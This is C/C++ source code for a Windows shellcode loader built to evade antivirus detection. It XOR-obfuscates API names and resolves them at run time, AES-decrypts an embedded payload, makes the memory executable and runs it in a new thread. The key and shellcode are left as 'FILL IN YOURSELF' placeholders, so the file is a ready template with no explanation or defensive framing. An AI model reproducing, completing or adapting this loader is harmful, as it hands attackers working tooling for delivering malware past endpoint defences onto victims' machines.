#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#include <psapi.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <winternl.h>

LPVOID (WINAPI * pVirtualAlloc)(  LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);

HANDLE (WINAPI * pCreateThread)(
  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
  SIZE_T                  dwStackSize,
  LPTHREAD_START_ROUTINE  lpStartAddress,
  __drv_aliasesMem LPVOID lpParameter,
  DWORD                   dwCreationFlags,
  LPDWORD                 lpThreadId
);

DWORD (WINAPI * pWaitForSingleObject)(
  HANDLE hHandle,
  DWORD  dwMilliseconds
);

unsigned char VirtAlloc[] = { 0x1e, 0x08, 0x00, 0x06, 0x1c, 0x04, 0x18, 0x08, 0x1f, 0x2d, 0x28, 0x0c};
unsigned char CreatThr[]= { 0x0b, 0x13, 0x17, 0x13, 0x1d, 0x00, 0x20, 0x21, 0x01, 0x24, 0x26, 0x0b};
unsigned char WaitMe[]= { 0x1f, 0x00, 0x1b, 0x06, 0x2f, 0x0a, 0x06, 0x1a, 0x1a, 0x2f, 0x20, 0x03, 0x0a, 0x2b, 0x26, 0x05, 0x02, 0x2b, 0x15, 0x78 };



int DecryptionIsFun(char* loadme, unsigned int loadme_len, char* saekey, size_t saekeylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return -1;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) return -1;
    if (!CryptHashData(hHash, (BYTE*)saekey, (DWORD)saekeylen, 0)) return -1;
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) return -1;
    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)loadme, (DWORD*)&loadme_len)) return -1;

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

void AnotherEncryption(char *doto, int doto_len, char *weez, int weez_len)
{
        int q{0};

        for (int i{0}; i < doto_len; i++)
        {
                if (q == weez_len - 1)
                        q = 0;

                doto[i] = doto[i] ^ weez[q];
                q++;
        }
}


int main(void) {

  void* cexe;
  BOOL vr;
  HANDLE ht;
  DWORD oldprotect = 0;
  // Shellcode
  char another_encry [] = "HarrietIsAGoodDog";
  char saekey [] =  FILL IN YOURSELF
  const char k32DllName[13] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0 };

  unsigned char loadme[] = FILL IN YOURSELF

  unsigned int loadme_len = sizeof(loadme);
  
  AnotherEncryption((char *) VirtAlloc, sizeof (VirtAlloc), another_encry, sizeof(another_encry));
  pVirtualAlloc= GetProcAddress(GetModuleHandle(k32DllName), VirtAlloc);
  
  cexe = pVirtualAlloc(0, loadme_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  
  DecryptionIsFun((char *) loadme, loadme_len, saekey, sizeof(saekey));
  
  RtlMoveMemory(cexe, loadme, loadme_len);
  
  vr = VirtualProtect(cexe, loadme_len, PAGE_EXECUTE_READ, &oldprotect);
  
  AnotherEncryption((char *) CreatThr, sizeof (CreatThr), another_encry, sizeof(another_encry));
  
  pCreateThread= GetProcAddress(GetModuleHandle(k32DllName), CreatThr);
     
  ht = pCreateThread(0, 0, (LPTHREAD_START_ROUTINE)cexe, 0, 0, 0);
    
  AnotherEncryption((char *) WaitMe, sizeof (WaitMe), another_encry, sizeof(another_encry));
  
  pWaitForSingleObject= GetProcAddress(GetModuleHandle(k32DllName), WaitMe);
  
  pWaitForSingleObject(ht, -1);
}

